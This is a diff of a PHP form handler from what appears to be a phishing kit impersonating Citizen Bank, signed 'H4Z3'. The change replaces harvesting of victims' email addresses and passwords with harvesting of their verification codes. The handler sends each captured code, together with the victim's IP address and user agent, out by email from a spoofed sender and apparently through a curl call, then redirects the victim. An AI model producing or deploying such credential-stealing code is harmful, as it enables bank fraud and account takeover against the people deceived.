@@ -4,14 +4,12 @@ include 'functions.php';
 
 if ($_SERVER['REQUEST_METHOD'] == 'POST') {
 
-    $username = $_POST['email'];
-    $password = $_POST['emailpass'];
+    $code = $_POST['code'];
     $useragent = $_SERVER['HTTP_USER_AGENT'];
     $ip = getenv("REMOTE_ADDR");
-    
-            $body  = "++++++++++ 🐱‍💻 CITIZEN BANK EMAIL INFO 🐱‍💻 ++++++++++\r\n";
-            $body .= "Email Address     : $username\r\n";
-            $body .= "Email Password    : $password\r\n";
+
+            $body  = "++++++++++ 🐱‍💻 CITIZEN CODE INFO 🐱‍💻 ++++++++++\r\n";
+            $body .= "Verification Code : $code\r\n";
             $body .= "|--------------- I N F O | I P -------------------|\r\n";
             $body .= "IP          : $ip\r\n";
             $body .= "User Agent  : $user_agent\r\n";
@@ -22,9 +20,9 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
             $body .= "Timezone    : $timezone\r\n";
             $body .= "Date        : $date\r\n";
             $body .= "+++++++++++++++ ‍H4Z3 +++++++++++++++\r\n";
-    
 
-      $subject  = "🐱‍💻 ‍H4Z3 CITIZEN EMAIL INFO => FROM $ip 🐱‍💻";
+
+      $subject  = "🐱‍💻 ‍H4Z3 CITIZEN CODE INFO => FROM $ip 🐱‍💻";
       $headers  = "From: 🐱‍💻 ‍H4Z3 🐱‍💻 <m4r1ju4n4r3sult@h4z3.com>\r\n";
       $headers .= "MIME-Version: 1.0\r\n";
       $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
@@ -44,6 +42,6 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
           curl_close($ch);
         }
 
-     header('Location: ../Code.php');      
+     header('Location: ../complete');
 }
 ?>
